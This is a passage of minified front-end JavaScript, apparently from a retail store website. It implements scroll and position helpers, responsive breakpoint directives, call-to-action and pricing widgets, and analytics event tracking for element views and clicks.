this.getValues()[0]},e.prototype.getY=function(){return this.getValues()[1]},e.prototype.zeroY=function(){return new e(this.getX(),0)},e.prototype.zeroX=function(){return new e(0,this.getY())},e.fromElementOffset=function(t){var e=t.offsetParent;return e&&f0(e)&&h0()?new this(t.offsetLeft-e.offsetLeft,t.offsetTop-e.offsetTop):new this(t.offsetLeft,t.offsetTop)},e.fromMatrix=function(t){return new this(t.translateX,t.translateY)},e.fromElementScroll=function(t){return new this(t.scrollLeft,t.scrollTop)},e.fromElementTransform=function(t){return this.fromMatrix(fo.fromElementTransform(t))},e.fromWheelEvent=function(t){return new this(t.deltaX,t.deltaY)},e.prototype.positionElement=function(t){t.style.left=this.x+"px",t.style.top=this.y+"px"},e.prototype.positionElementByTranslation=function(t){t.style.transform="translate("+this.x+"px, "+this.y+"px)"},e.prototype.trendsHorizontal=function(){return Od(this.getX(),this.getY())===Math.abs(this.getX())},e.prototype.trendsVertical=function(){return Od(this.getX(),this.getY())===Math.abs(this.getY())},e.prototype.toString=function(){return"X: "+this.getX()+", Y: "+this.getY()},e}(Wn);function d0(t){return void 0===t&&(t=null),t?sr.fromElementOffset(t):sr.fromRootElement()}var dL=function(){var t=function(e,i){return(t=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])})(e,i)};return function(e,i){function r(){this.constructor=e}t(e,i),e.prototype=null===i?Object.create(i):(r.prototype=i.prototype,new r)}}(),p0=function(t){function e(e){return void 0===e&&(e=null),t.call(this,e)||this}return dL(e,t),e.prototype.getDimensions=function(){return this.getLastValue()},e.prototype.getValues=function(){return d0(this.element).getValues()},e.getForElement=function(t,e){return void 0===e&&(e=[null]),yi.getForElement.bind(this)(t,e)},e.getSingleton=function(t){return yi.getSingleton.bind(this)(t)},e.VectorClass=sr,e}(yi),pL=function(){var t=function(e,i){return(t=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])})(e,i)};return function(e,i){function r(){this.constructor=e}t(e,i),e.prototype=null===i?Object.create(i):(r.prototype=i.prototype,new r)}}(),m0=function(t){function e(e){return void 0===e&&(e=null),t.call(this,e)||this}return pL(e,t),e.prototype.getValues=function(){return sr.fromInnerWindow().getValues()},e.getForElement=function(t,e){return void 0===e&&(e=null),e&&ct.throw("WindowDimensions should not be used with elements"),yi.getForElement.bind(this)(t)},e.getSingleton=function(t){return yi.getSingleton.bind(this)(t)},e.VectorClass=sr,e}(yi),mL=function(){var t=function(e,i){return(t=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])})(e,i)};return function(e,i){function r(){this.constructor=e}t(e,i),e.prototype=null===i?Object.create(i):(r.prototype=i.prototype,new r)}}(),gL=function(){for(var t=0,e=0,i=arguments.length;e<i;e++)t+=arguments[e].length;var r=Array(t),n=0;for(e=0;e<i;e++)for(var s=arguments[e],o=0,a=s.length;o<a;o++,n++)r[n]=s[o];return r},_i=function(t){function e(e){void 0===e&&(e=null);var i=t.call(this,e)||this;return i.windowDimensions_=m0.getSingleton(i),i.scrollElementDimensions_=p0.getForElement(i,[er]),i}return mL(e,t),e.prototype.getPosition=function(){return this.getLastValue()},e.prototype.getValues=function(){return[this.getScrollX_(),this.getScrollY_()]},e.prototype.getScrollX_=function(){return this.element?this.element.scrollLeft:window.pageXOffset||er.scrollLeft},e.prototype.getScrollY_=function(){return this.element?this.element.scrollTop:window.pageYOffset||er.scrollTop},e.prototype.getScrollPercent=function(){var t=this.scrollElementDimensions_.getLastValue().subtract(this.windowDimensions_.getLastValue()).getValues(),e=Vt(this.getValues(),t);return new(Je.bind.apply(Je,gL([void 0],e.map((function(t){return t[0]/t[1]})))))},e.prototype.isScrollingDown=function(){return this.getDelta().y<0},e.prototype.isScrollingUp=function(){return this.getDelta().y>0},e.prototype.isScrollingRight=function(){return this.getDelta().x>0},e.prototype.isScrollingLeft=function(){return this.getDelta().x<0},e.getForElement=function(t,e){return void 0===e&&(e=[null]),yi.getForElement.bind(this)(t,e)},e.getSingleton=function(t){return yi.getSingleton.bind(this)(t)},e.prototype.renderLoopCleanup_=function(t){de.scrollCleanup(t)},e.prototype.renderLoopPremeasure_=function(t){de.scrollPremeasure(t)},e.prototype.destroy=function(e){t.prototype.destroy.call(this,e),this.windowDimensions_.destroy(this),this.scrollElementDimensions_.destroy(this)},e.VectorClass=Je,e}(yi),vL=Fc.getSingleton(),g0=Mr.getBrowser();function vt(t,e){var i=g0.getSupportedStyleProperty(e),r=vL.getComputedStyle(t).getPropertyValue(i);return g0.getGenericStyleValue(e,r)}var yL=new Set(["fixed","absolute"]);function v0(t){for(var e=0,i=t.previousElementSibling;i;){var r=vt(i,"position");if(!yL.has(r)){if("sticky"!==r){e+=i.offsetTop+i.offsetHeight;break}e+=i.offsetHeight}i=i.previousElementSibling}return e}function y0(t){if("sticky"!==vt(t,"position"))return t.offsetTop;for(var e=v0(t),i=t.parentElement,r=0;i!==t.offsetParent;)r+=v0(i),i=i.parentElement;return e+r}var dY=new Set(["fixed","absolute"]);function _0(t){if("sticky"!==vt(t,"position"))return 0;var e=y0(t),i=t.parentElement,r=Ir(i),n=i.offsetHeight-e-t.offsetHeight,s=-1*(e+r);return new Ae(0,n).clamp(s)}function Rd(t){return"fixed"===vt(t,"position")}function _L(t){return b0(t)-_0(t)}function b0(t){return t.offsetTop+Je.fromElementTransform(t).y}function bL(t,e){for(var i=t,r=0;i&&i!==document.body;){if(Rd(i))return r+i.offsetTop;r+=e(i)-i.scrollTop,i=i.offsetParent}var n=_i.getSingleton(this),s=n.getPosition().invert();return n.destroy(this),r+s.y}function w0(t,e){return Rd(t)?t.offsetTop:e(t)+bL(t.offsetParent,e)}var Vc=function(){function t(){this.cache_=Xe.usingFunction((function(t){return w0(t,b0)})),this.cacheIgnoringSticky_=Xe.usingFunction((function(t){return w0(t,_L)})),this.init_()}return t.prototype.init_=function(){this.renderLoop_()},t.prototype.getVisibleDistanceFromRoot=function(t){return this.cache_.get(t)},t.prototype.getVisibleDistanceFromRootIgnoringSticky=function(t){return this.cacheIgnoringSticky_.get(t)},t.prototype.renderLoop_=function(){var t=this;de.anyMutate((function(){de.anyCleanup((function(){t.clearCaches_(),t.renderLoop_()}))}))},t.prototype.clearCaches_=function(){this.cache_.clear(),this.cacheIgnoringSticky_.clear()},t.getSingleton=function(){return this.singleton_=this.singleton_||new this},t.singleton_=null,t}(),wL=Vc.getSingleton();function Ir(t){return wL.getVisibleDistanceFromRoot(t)}function E0(t){var e=Ir(t);return new Ae(e,e+t.offsetHeight)}var po=class{static isProd(){return window.location.host.includes("store.google.")}static turnOffLazyImage(){let t=window.location.search.split("lazyImage=")[1];return t=t&&t.split("&")[0],"false"==t}static turnOffLazyInstantiate(){let t=window.location.search.split("lazyInstantiate=")[1];return t=t&&t.split("&")[0],"false"==t}static sequenceCount(){let t=window.location.search.split("sequenceCount=")[1];return!po.isProd()&&t&&t.split("&")[0]}static reduceSequenceCount(){let t=window.location.search.split("reduceSequenceCount=")[1];return t=t&&t.split("&")[0],!po.isProd()&&"true"==t}static evBypassEnabled(){let t=window.location.search.split("evBypass=")[1];return t=t&&t.split("&")[0],"true"==t}},yr=po;function S0(t,e,i){let r=()=>{n.unobserve(t),n.disconnect(),r=null},n=new IntersectionObserver((e=>i(t,e,r)),e);return n.observe(t),{observer:n,done:r}}var EL={isElementInView:(t,e=0,i=1)=>{let r=t.offsetHeight,n=E0(t),s=window.innerHeight||document.documentElement.clientHeight,o=n.getMin()+r*e,a=n.getMax()-r*(1-i);return(a>=0||o>=0)&&(o<=s||a<=s)},elementInViewWatcherFirstChangeOnly:(t,e,i)=>yr.evBypassEnabled()?(window.setTimeout((()=>{i(t,{isIntersecting:!0,isVisible:!0},(()=>{}))})),{observer:null,done:()=>{}}):S0(t,e,((t,e,r)=>i(t,e[0],r))),elementInViewWatcher:(t,e,i)=>S0(t,e,((t,e,r)=>i(t,e.slice(-1)[0],r)))},Et=EL,Md=class{static setupNativeSmoothScroll(){!window.URLSearchParams||yr.isProd()||document.documentElement.classList.add("mqn-ext-native-smooth-scroll")}static disposeNativeSmoothScroll(){document.documentElement.classList.remove("mqn-ext-native-smooth-scroll")}},$d=Md,HI=ye(C0()),I0=ye(x0()),P0=class{static get $inject(){return["$element","$scope"]}constructor(t,e){this.accessibleOutline=new I0.AccessibleOutline(t[0]),e.$on("$destroy",(()=>this.dispose()))}dispose(){this.accessibleOutline.dispose()}},RL=function(){return{restrict:"A",controller:P0}},O0=RL,FL=Fd(),NL=function(){return{restrict:"A",link:function(t,e,i){let r=i.mqnAddBrowserName,n=e[0];["isAndroid","isChrome","isFirefox","isIOS","isIE","isIEorEdge","isMobile","isSafari"].forEach((function(t){if(FL[t]()&&n.classList.add(r+"--"+t),"isIOS"===t&&/iP(hone|od|ad)/.test(navigator.platform)){let e=navigator.appVersion.match(/OS (\d+)_(\d+)_?(\d+)?/),i=parseInt(e[1],10);i<=10&&(n.classList.add(`${r}--${t}-legacy`),n.setAttribute(`${r}--${t}-legacy`,"")),11===i&&(n.classList.add(`${r}--${t}-11`),n.setAttribute(`${r}--${t}-11`,""))}}))}}},F0=NL,N0=t=>window.jQuery(t).closest(`.${te.mqnCssName("mqn2-frame")}`)[0],VL=t=>{let e=N0(t),i=Array.from(document.querySelectorAll(".main-body-content")),r=Et.elementInViewWatcherFirstChangeOnly(t,null,((t,r,n)=>{r.isIntersecting&&(e.style.overflow="visible",i.forEach((t=>{t.style.overflow="visible"})))}));return{done:()=>{e.style.overflow="",i.forEach((t=>{t.style.overflow=""})),r.done()}}},Tt={getClosestMqnFrame:N0,makeSmithCooperateWithNativeSticky:VL},Nd=ye(en());yd();var jt={MQN_PRODUCT:"mqn-autotrack-product",MQN_PAGE_TYPE:"mqn-autotrack-page-type",MQN_MODULE_NAME:"mqn-autotrack-module-name",MQN_PARTIAL_TYPE:"mqn-autotrack-partial-type",MQN_EVENT:"mqn-autotrack-event",MQN_CATEGORY:"mqn-autotrack-category",MQN_OUTVIEW_EVENT:"mqn-autotrack-outview-event",MQN_OUTVIEW_CATEGORY:"mqn-autotrack-outview-category",MQN_ACTION:"mqn-autotrack-action",MQN_LABEL:"mqn-autotrack-label",MQN_INTERACTION_TYPE:"mqn-autotrack-interaction-type",MQN_INVIEW:"mqn-autotrack-inview",MQN_INVIEW_THRESHOLD:"mqn-autotrack-inview-threshold",MQN_IMMEDIATE:"mqn-autotrack-immediate",MQN_LISTENER:"mqn-autotrack-event-listener"},As={INVIEW:"inview",OUTVIEW:"outview",CLICK:"click"},V0=class{static get $inject(){return["$element","$scope","$attrs","$timeout","$window","$rootScope"]}constructor(t,e,i,r,n,s){if(this.el=t[0],this.$window=n,this.outviewObservers=[],this.outviewTimeTracker=[],this.hasScrolled=!1,this.hasScrolledDisposer=null,this.started=!1,this.elements=Array.prototype.slice.call(this.el.querySelectorAll(`[${jt.MQN_INVIEW}]`)),this.elements=this.elements.filter((t=>{let e;for(;t;){if(e=t.parentElement,""==e.getAttribute("mqn-autotrack"))return t=null,e==this.el;t=e}})),this.el.hasAttribute(jt.MQN_INVIEW)&&this.elements.push(this.el),this.el.hasAttribute(jt.MQN_IMMEDIATE))this.start();else if(window.MQN2_TRACKING_NAVIGATION_READY)this.start();else{let t=()=>{this.start()};this.trackNavigationEventDisposer=()=>{document.removeEventListener("trackingNavigationEvent",t)},document.addEventListener("trackingNavigationEvent",t,{once:!0})}e.$on("$destroy",(()=>{this.dispose_()}))}start(){if(this.started)return;this.started=!0;let t=()=>{this.hasScrolled=!0};this.hasScrolledDisposer=()=>{window.removeEventListener("scroll",t,{once:!0,passive:!0})},window.setTimeout((()=>{this.setupInviewMonitoring_(),this.setupClickMonitoring_(),window.addEventListener("scroll",t,{once:!0,passive:!0})}),100)}setupClickMonitoring_(){this.listenerRemover=this.addDelegatedListener(this.el,"click",(t=>{let e=t.getAttribute(jt.MQN_EVENT),i=""==t.getAttribute(jt.MQN_INVIEW);e&&!i&&this.track(t,As.CLICK)}))}setupInviewMonitoring_(){this.elements.forEach(((t,e)=>{let i=0;t.hasAttribute(jt.MQN_INVIEW_THRESHOLD)&&(i=+t.getAttribute(jt.MQN_INVIEW_THRESHOLD)),Et.elementInViewWatcherFirstChangeOnly(t,{threshold:i},((t,i,r)=>{i.isIntersecting&&(this.track(t,As.INVIEW),this.elements.splice(e,1),r(),this.outviewObservers.push(Et.elementInViewWatcherFirstChangeOnly(t,null,((t,e,i)=>{!e.isIntersecting&&this.hasScrolled&&(this.track(t,As.OUTVIEW),i())}))))}))}))}track(t,e){let i=t.getAttribute(jt.MQN_EVENT),r=t.getAttribute(jt.MQN_PAGE_TYPE),n=t.getAttribute(jt.MQN_PRODUCT),s=t.getAttribute(jt.MQN_PARTIAL_TYPE),o=t.getAttribute(jt.MQN_CATEGORY),a=t.getAttribute(jt.MQN_ACTION),l=t.getAttribute(jt.MQN_LABEL),h=t.getAttribute(jt.MQN_MODULE_NAME),c=t.getAttribute(jt.MQN_INTERACTION_TYPE);if(e==As.OUTVIEW&&(i=t.getAttribute(jt.MQN_OUTVIEW_EVENT),o=t.getAttribute(jt.MQN_OUTVIEW_CATEGORY)),"click"==e){l=l||window.location.pathname;let e=Tt.getClosestMqnFrame(t);r=e.getAttribute(jt.MQN_PAGE_TYPE),n=e.getAttribute(jt.MQN_PRODUCT),s=e.getAttribute(jt.MQN_PARTIAL_TYPE),"look_up"==h&&(h=e.getAttribute(jt.MQN_MODULE_NAME)||e.getAttribute(jt.MQN_ACTION)),a||(a=e.getAttribute(jt.MQN_ACTION))}l||(l="(not set)");let u=Rc(),d=Mc(),p={event:i,eventAction:a,eventCategory:o,eventLabel:l,eventParams:{moduleName:h||a,moduleType:s,pageName:window.location.pathname,productFamilyDocId:u,productDocId:d}};e==As.CLICK?p.nonInteraction="0":p.nonInteraction="1",e==As.INVIEW&&this.outviewTimeTracker.push({element:t,start:new Date}),e==As.OUTVIEW&&this.outviewTimeTracker.forEach(((e,i)=>{if(e.element==t){let t=e.start,i=((new Date).getTime()-t.getTime())/1e3,r=300;p.secondsInView=Math.min(r,i),this.outviewTimeTracker.splice(e,1)}})),c&&(p.interactionType=c);for(let t in p)p[t]||delete p[t];Nd.default.trackDataLayer(p),p.eventLabel.includes("/config/")&&!("products"in p)&&Nd.default.trackDataLayer({products:p.eventLabel.replace("/config/",""),event:"buy_now"})}addDelegatedListener(t,e,i){let r=t=>{let e=(t=t||window.event).target||t.srcElement;e=3===e.nodeType?e.parentNode:e;do{i(e,t),e.parentNode&&(e=e.parentNode)}while(e.parentNode)};return t.addEventListener(e,r),()=>{t.removeEventListener(e,r)}}dispose_(){this.listenerRemover&&this.listenerRemover(),this.windowScrollRemover&&this.windowScrollRemover(),this.hasScrolledDisposer&&this.hasScrolledDisposer(),this.trackNavigationEventDisposer&&this.trackNavigationEventDisposer(),this.outviewObservers.forEach((t=>{t.done()}))}},qL=function(){return{restrict:"A",controller:V0}},q0=qL,BL=function(){return{restrict:"A",scope:{mqnAutotrackDecoratorTargets:"&",mqnAutotrackDecoratorTargetsTarget:"&"},link:function(t,e,i){let r=e[0],n=(i.mqnAutotrackDecoratorTargetsTarget,r.querySelectorAll("a[href]"));[].forEach.call(n,(function(t){t.href&&!t.hasAttribute("mqn-autotrack-event")&&(t.setAttribute("mqn-autotrack-event","module interaction"),t.setAttribute("mqn-autotrack-category","module click"),t.setAttribute("mqn-autotrack-module-name","look_up"))}))}}},B0=BL,W0=ye(nc()),U0=class{static get $inject(){return["$element","$attrs","$scope","$timeout","$window"]}constructor(t,e,i,r,n){this.canvas=t[0],this.ctx=this.canvas.getContext("2d"),this.video=document.querySelector(`#${e.mqnBlurryVideo} video`),this.raf=new W0.default((()=>{this.ctx.drawImage(this.video,0,0,this.canvas.offsetWidth,this.canvas.offsetHeight)})),i.$watch("mqnBlurryVideoActive",((t,e)=>{t?this.raf.start():this.raf.stop()})),i.$on("$destroy",(()=>{this.dispose_()}))}dispose_(){this.raf.stop()}},WL=function(){return{restrict:"A",controller:U0,scope:{mqnBlurryVideoActive:"=mqnBlurryVideoActive"}}},H0=WL,G0=class{static get $inject(){return["$element","$scope","$attrs","$rootScope"]}constructor(t,e,i,r){this.element=t[0],this.windowListener=null,this.activeClass=null,this.conditions={mobile:i.mqnBreakpointClassMobile,tablet:i.mqnBreakpointClassTablet,desktop:i.mqnBreakpointClassDesktop,desktopTablet:i.mqnBreakpointClassDesktopTablet,tabletMobile:i.mqnBreakpointClassTabletMobile},this.refresh_();let n=t=>{this.refresh_()};window.MQN_RESIZER?(window.MQN_RESIZER.addListener(n),this.windowListener=()=>{window.MQN_RESIZER&&window.MQN_RESIZER.removeListener(n)}):($window.addEventListener("resize",n),this.windowListener=()=>{$window.removeEventListener("resize",n)}),e.$on("$destroy",(()=>{this.dispose_()}))}applyClass(t){t&&(t.split(" ").forEach((t=>{this.element.classList.add(t)})),this.activeClass=t)}refresh_(){let t=window.innerWidth;this.activeClass&&this.activeClass.split(" ").forEach((t=>{this.element.classList.remove(t)})),t>=rt.TABLET&&this.conditions.desktopTablet?this.applyClass(this.conditions.desktopTablet):(t>=rt.DESKTOP&&this.applyClass(this.conditions.desktop),t>=rt.TABLET&&t<rt.DESKTOP&&(this.conditions.tabletMobile?this.applyClass(this.conditions.tabletMobile):this.applyClass(this.conditions.tablet))),t<rt.TABLET&&(this.conditions.tabletMobile?this.applyClass(this.conditions.tabletMobile):this.applyClass(this.conditions.mobile))}dispose_(){this.windowListener&&this.windowListener()}},UL=function(){return{restrict:"A",controller:G0}},z0=UL,HL="!important",j0=10,Y0=Mr.getBrowser();function Ie(t,e,i){var r=i.slice(-j0)===HL,n=r?"important":"",s=r?i.slice(0,-j0):i,o=Y0.getSupportedStyleProperty(e),a=Y0.getSupportedStyleValue(e,s);t.style.setProperty(o,a,n)}function X0(t,e){void 0===e&&(e=[" "]);for(var i=new Set(e),r=0;i.has(t[r]);)r++;return t.slice(r)}function Q0(t,e){void 0===e&&(e=[" "]);for(var i=new Set(e),r=t.length;i.has(t[r-1]);)r--;return t.slice(0,r)}function En(t,e){return void 0===e&&(e=[" "]),X0(Q0(t,e),e)}var K0=[" ","\n","\t"];function go(t){return"string"!=typeof t?(console.warn('A non-string value "'+t+'" (tyepof '+typeof t+") was provided to styleStringToMap"),new Map):t.split(";").map((function(t){return En(t,K0)})).filter((function(t){return!!ho(t,":")||(""!==t&&console.warn('Invalid property-style pair provided to styleStringToMap "'+t+'"'),!1)})).map((function(t){return t.split(":")})).map((function(t){return[t[0],t.slice(1).join(":")]})).map((function(t){return t.map((function(t){return En(t,K0)}))})).reduce((function(t,e){var i=e[0],r=e[1];return t.set(i,r),t}),new Map)}function Z0(t,e){t.style.setProperty(e,"")}var J0=class{static get $inject(){return["$element","$scope","$attrs"]}constructor(t,e,i){if(this.appliedStyles_=new Set,this.element=t[0],this.windowListener=null,this.conditions={all:i.mqnBreakpointStyleAll,mobile:i.mqnBreakpointStyleMobile,tablet:i.mqnBreakpointStyleTablet,desktop:i.mqnBreakpointStyleDesktop,desktopLarge:i.mqnBreakpointStyleDesktopLarge,desktopTablet:i.mqnBreakpointStyleDesktopTablet,tabletMobile:i.mqnBreakpointStyleTabletMobile,landscape:i.mqnBreakpointStyleLandscape,portrait:i.mqnBreakpointStylePortrait},this.forceEval=i.mqnBreakpointStyleForceEval,this.forceEval)for(let t in this.conditions)this.conditions[t]=e.$eval(this.conditions[t]);this.refresh_();let r=t=>{this.refresh_()};window.MQN_RESIZER?(window.MQN_RESIZER.addListener(r),this.windowListener=()=>{window.MQN_RESIZER&&window.MQN_RESIZER.removeListener(r)}):($window.addEventListener("resize",r),this.windowListener=()=>{$window.removeEventListener("resize",r)}),e.$on("$destroy",(()=>{this.dispose_()}))}applyStyle(t){let e;if(void 0!==t){if("string"==typeof t){if(""===t)return;e=t}else if(t instanceof Array){if(0===t.length)return;e=t.join(";")}else console.warn("Unknown type provided to breakpoint-style",t);Vr(go(e).entries(),(([t,e])=>{Ie(this.element,t,e),this.appliedStyles_.add(t)}))}}validCondition(t){return t&&!!t[0]&&t[0]&&void 0!==t[0][0]}refresh_(){let t=window.innerWidth;this.backgroundImage=this.element.style.backgroundImage,Vr(this.appliedStyles_.values(),(t=>Z0(this.element,t))),this.appliedStyles_.clear(),this.conditions.all&&this.applyStyle(this.conditions.all),this.validCondition(this.conditions.portrait)&&rt.isPortrait()&&this.applyStyle(this.conditions.portrait),this.validCondition(this.conditions.landscape)&&rt.isLandscape()&&this.applyStyle(this.conditions.landscape),t>=rt.DESKTOP_LARGE&&this.validCondition(this.conditions.desktopLarge)?this.applyStyle(this.conditions.desktopLarge):(t>=rt.TABLET&&this.validCondition(this.conditions.desktopTablet)?this.applyStyle(this.conditions.desktopTablet):(t>=rt.DESKTOP&&this.applyStyle(this.conditions.desktop),t>=rt.TABLET&&t<rt.DESKTOP&&(this.conditions.tabletMobile?this.applyStyle(this.conditions.tabletMobile):this.applyStyle(this.conditions.tablet))),t<rt.TABLET&&(this.conditions.tabletMobile?this.applyStyle(this.conditions.tabletMobile):this.applyStyle(this.conditions.mobile)))}dispose_(){this.windowListener&&this.windowListener()}},GL=function(){return{restrict:"A",controller:J0}},ew=GL,zL=function(){return{restrict:"A",link:function(t,e,i){var r=e[0];let n=i.mqnClickAnimation,s=()=>{r.classList.remove(n)},o=()=>{r.classList.remove(n),window.setTimeout((()=>{r.classList.add(n)}))};r.addEventListener("click",o),r.addEventListener("animationend",s),t.$on("$destroy",(()=>{r.removeEventListener("click",o),r.removeEventListener("animationend",s)}))}}},tw=zL,Va=ye(gt()),rw=ye(Nt()),iw=class{static get $inject(){return["$scope","$element"]}constructor(t,e){this.$scope=t,this.el=e[0],this.el.setAttribute("mqn-dynamic-cta-v2-js",!0),"true"==this.el.getAttribute("mqn-dynamic-cta-enabled")||null!==this.el.getAttribute("mqn-dynamic-cta-doc-id")?(this.domWatcher=new rw.DomWatcher,this.domWatcher.add({element:window,on:"smartResize",id:"resize",callback:()=>{let t=this.waitlistButton;window.innerWidth<=759?this.waitlistButton=this.waitlistButtonMobile:this.waitlistButton=this.waitlistButtonDesktop,t!==this.waitlistButton&&(this.currentWaitlistButtonLabel="",this.getWaitListButtonLabel())}}),this.getPdpBuyText=null!==this.el.getAttribute("mqn-dynamic-cta-label"),this.getUrl=null!==this.el.getAttribute("mqn-dynamic-cta-url"),this.waitlistButtonDesktop=this.getDesktopWaitlistButton(),this.waitlistButtonMobile=this.getMobileWaitlistButton(),this.currentWaitlistButtonLabel="",this.domWatcher.run("resize"),this.waitlistButton?this.initWaitlistButton():this.init()):this.el.setAttribute("mqn-dynamic-cta-done",!0)}getPrimaryCtaButton(){return document.querySelector("#pdb button.transaction")||document.querySelector('button[data-test="cta"]')}getDesktopWaitlistButton(){return document.querySelector("#pdb button.waitlist")}getMobileWaitlistButton(){return document.querySelector("[bottom-pdp-bar] button.waitlist")}init(){let t=this.el,e=t.style.display;Va.func.waitUntil((()=>{let i=this.getPrimaryCtaButton();if(!i)return!1;let r="disabled"===i.getAttribute("disabled");return t.style.display=r?"none":e,!r}),3e4).then((()=>{let e=this.getPrimaryCtaButton(),i="disabled"===e.getAttribute("disabled");if(e&&!i){if(this.domWatcher.add({element:this.el,on:"click",callback:()=>{e.click()}}),this.getPdpBuyText){let t=e.textContent;t&&this.setLabel(t);let i=e.getAttribute("aria-label");i&&this.el.setAttribute("aria-label",i)}}else t.style.display="none";this.el.setAttribute("mqn-dynamic-cta-done",!0)}),(()=>{t.style.display="none",this.el.setAttribute("mqn-dynamic-cta-done",!0)}))}setLabel(t){let e=this.el.querySelector("[text]");e&&(e.textContent=t)}initWaitlistButton(){this.el.removeAttribute("href"),this.currentWaitlistButtonLabel="",this.pollWaitlistButtonLabel().then((()=>{this.el.setAttribute("mqn-dynamic-cta-done",!0),this.setLabel(this.currentWaitlistButtonLabel)})).catch((()=>{})),this.domWatcher.add({element:this.waitlistButtonDesktop,on:"click",callback:()=>{this.getWaitListButtonLabel()}}),this.domWatcher.add({element:this.waitlistButtonMobile,on:"click",callback:()=>{this.getWaitListButtonLabel()}}),this.domWatcher.add({element:this.el,on:"click",callback:()=>{this.waitlistButton.click(),this.getWaitListButtonLabel()}})}getWaitListButtonLabel(){!this.waitlistButtonDesktop||(this.el.classList.add("disabled"),this.pollWaitlistButtonLabel().then((()=>{this.setLabel(this.currentWaitlistButtonLabel),this.el.classList.remove("disabled")})).catch((()=>{})))}pollWaitlistButtonLabel(){let t=this.currentWaitlistButtonLabel,e=()=>{let t=Array.from(this.waitlistButton.parentNode.querySelectorAll(".waitlist > span")),e="";return t.forEach((t=>{"none"!==Va.dom.getComputedStyle(t).display&&(e=t.textContent)})),this.currentWaitlistButtonLabel=e,e};return Va.func.waitUntil((()=>t!==e()),1e6,40)}dispose(){this.domWatcher.dispose()}};function Vd(){return{restrict:"A",controller:iw}}bs();var jL={REPLACE_SPAN:"replace-span"},nw=class{static get $inject(){return["$scope","$element","$sce","$sanitize"]}constructor(t,e,i,r){this.$scope=t,this.el=e[0],this.$sce=i,this.$sanitize=r,window.setTimeout((()=>{this.init()}))}init(){let t=this.el.getAttribute("mqn-dynamic-pricing-bundle"),e=this.el.getAttribute("mqn-dynamic-pricing-bundle-footnote-symbol"),i=this.el.getAttribute("mqn-dynamic-pricing-behavior"),r=this.el.getAttribute("mqn-dynamic-pricing-docid"),n=this.el.getAttribute("mqn-dynamic-pricing-display");if(i==jL.REPLACE_SPAN){let t=this.el.querySelector("span");if(!t)return;t.setAttribute("jsname","xBognb"),t.setAttribute("data-docid",r),t.setAttribute("data-display",n),document.dispatchEvent(new CustomEvent("populatePrices"))}else if(t){if(t&&"[]"===t)return;let i=JSON.parse(t);i&&i.length&&_n().then((t=>{t.getBundlePrice(i,e).then((t=>{t.financingHtml?this.el.innerHTML=this.$sanitize(t.financingHtml):t.html&&(this.el.innerHTML=this.$sanitize(t.html))}))}))}}};function qd(){return{restrict:"A",controller:nw}}function Fi(t,e){de.anyMutate((function(){return t.classList.add(e)}))}function Ni(t){for(var e=[],i=1;i<arguments.length;i++)e[i-1]=arguments[i];de.anyMutate((function(){var i;return(i=t.classList).remove.apply(i,e)}))}var qa=Object.freeze({TOP:"top",CENTER:"center",BOTTOM:"bottom"}),sw=class{constructor(t){this.el=t,this.rl_=de.getDestroyableInstance(),this.attrs=this.el.getAttribute("mqn-elevator-car");let e=!!this.attrs&&JSON.parse(this.attrs)||{};this.cssTriggers=e.cssTriggers||[],this.stickPosition_=e.stickPosition||qa.BOTTOM}fixCssClass_(t){return t.replace(/\./g,"")}getTopPositionToStickTo_(t){switch(this.stickPosition_){case qa.TOP:return 0;case qa.CENTER:return Math.min(0,Math.max((window.innerHeight-this.el.offsetHeight)/2,t.top));case qa.BOTTOM:return Math.min(0,Math.max(window.innerHeight-this.el.offsetHeight,t.top))}}update(t,e){this.updatePosition_(e),this.updateCssTriggers_(t)}updatePosition_(t){this.stickPosition_!==qa.TOP&&this.rl_.mutate((()=>{Ie(this.el,"top",`${this.getTopPositionToStickTo_(t)}px`)}))}updateCssTriggers_(t){!this.cssTriggers||this.cssTriggers.forEach((e=>{let i=new Ae(0,100).getOverlap(new Ae(e.from,e.to)),r=new Ae(0,100).clamp(t);i.contains(r)?Fi(this.el,this.fixCssClass_(e.class)):Ni(this.el,this.fixCssClass_(e.class))}))}destroy(){this.rl_.destroy()}},ow=class{static get $inject(){return["$element","$scope"]}constructor(t,e){this.el=t[0],this.$scope=e,this.rl_=de.getDestroyableInstance(),this.parentFrame=Tt.getClosestMqnFrame(this.el),this.rl_.mutate((()=>{this.parentFrame.setAttribute("mqn-elevator-frame",!0)})),this.gordonFrames=Array.from(document.querySelectorAll(".main-body-content")),this.cars=Array.from(this.el.querySelectorAll("[mqn-elevator-car]")),this.elevatorCarInstances=this.cars.map((t=>new sw(t))),this.observer=Et.elementInViewWatcherFirstChangeOnly(this.el,null,((t,e,i)=>{e.isIntersecting&&this.gordonFrames.forEach((t=>{t.style.overflow="visible"}))})),window.setTimeout((()=>this.updateOnFrame())),e.$on("$destroy",(()=>this.dispose_()))}getPercent(t,e){return Math.min(100,Math.max(0,t/e*100))}updateOnFrame(){this.rl_.measure((()=>{this.rl_.cleanup((()=>this.updateOnFrame()));let t=this.el.getBoundingClientRect(),e=window.innerHeight-t.top,i=this.getPercent(e,t.height);this.elevatorCarInstances.forEach((e=>e.update(i,t)))}))}dispose_(){this.observer&&this.observer.done(),this.rl_.destroy(),this.elevatorCarInstances.forEach((t=>t.destroy()))}},YL=function(){return{restrict:"A",controller:ow}},aw=YL,uw=ye(Nt()),hw=ye(pn());function XL(){return window.innerWidth>760?72:55}function QL(){return window.innerWidth>760?0:52}function Sn(){let t=document.querySelector("[pdp-bar]");return t||(t=document.querySelector('[data-text="pdp-bar"]')),t?t.offsetHeight:XL()}function lw(){let t=document.querySelector(".navbar");return t?t.offsetHeight:0}function Bc(){let t=document.querySelector("[bottom-pdp-bar]");return t?t.offsetHeight:QL()}function cw(){return window.innerWidth/(window.innerHeight-Sn())}function fw(){return{restrict:"A",scope:{mqnGdnHeight:"="},link:function(t,e,i){let r=t.mqnGdnHeight;if(!r||"object"!=typeof r)return;let n=e[0],s=new uw.DomWatcher;s.add({id:"resize",element:window,on:"smartResize",callback:hw.func.debounce((()=>{Object.keys(r).forEach((t=>{((t,e)=>{let 